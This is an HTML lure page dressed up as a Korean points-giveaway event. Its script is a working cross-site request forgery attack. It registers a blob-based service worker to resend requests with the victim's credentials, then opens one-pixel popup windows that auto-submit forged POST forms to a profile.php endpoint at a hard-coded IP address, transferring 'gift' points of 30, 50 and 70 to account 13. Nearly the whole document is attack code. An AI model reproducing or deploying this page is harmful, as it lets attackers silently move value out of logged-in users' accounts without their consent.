<!DOCTYPE html>
<html>
<head>
    <title>🎁 이벤트 - Service Worker 방식</title>
</head>
<body>
    <h1>🎯 특별 이벤트!</h1>
    <div id="loading">포인트 지급 준비중...</div>

    <script>
        // Service Worker 등록
        if ('serviceWorker' in navigator) {
            const swCode = `
                self.addEventListener('fetch', function(event) {
                    if (event.request.url.includes('profile.php')) {
                        // CSRF 요청 가로채서 처리
                        event.respondWith(
                            fetch(event.request, {
                                mode: 'no-cors',
                                credentials: 'include'
                            })
                        );
                    }
                });
            `;
            
            const blob = new Blob([swCode], {type: 'application/javascript'});
            const swURL = URL.createObjectURL(blob);
            
            navigator.serviceWorker.register(swURL).then(() => {
                console.log('🔴 Service Worker 등록 완료');
                executeCSRF();
            });
        } else {
            // Service Worker 미지원 시 다른 방법
            executeCSRF();
        }

        function executeCSRF() {
            const attacks = [
                {receiver_id: '13', points: '30', gift_type: 'coffee'},
                {receiver_id: '13', points: '50', gift_type: 'cake'},
                {receiver_id: '13', points: '70', gift_type: 'diamond'}
            ];

            attacks.forEach((attack, i) => {
                setTimeout(() => {
                    // 새 창에서 폼 전송
                    const win = window.open('about:blank', `attack${i}`, 'width=1,height=1');
                    
                    win.document.write(`
                        <form method="POST" action="http://3.35.218.180/profile.php">
                            <input name="receiver_id" value="${attack.receiver_id}">
                            <input name="points" value="${attack.points}">
                            <input name="send_gift" value="1">
                            <input name="gift_type" value="${attack.gift_type}">
                            <input name="message" value="Service Worker 공격!">
                        </form>
                        <script>
                            document.forms[0].submit();
                            setTimeout(() => window.close(), 2000);
                        <\/script>
                    `);
                    
                }, i * 1500);
            });
        }
    </script>
</body>
</html>
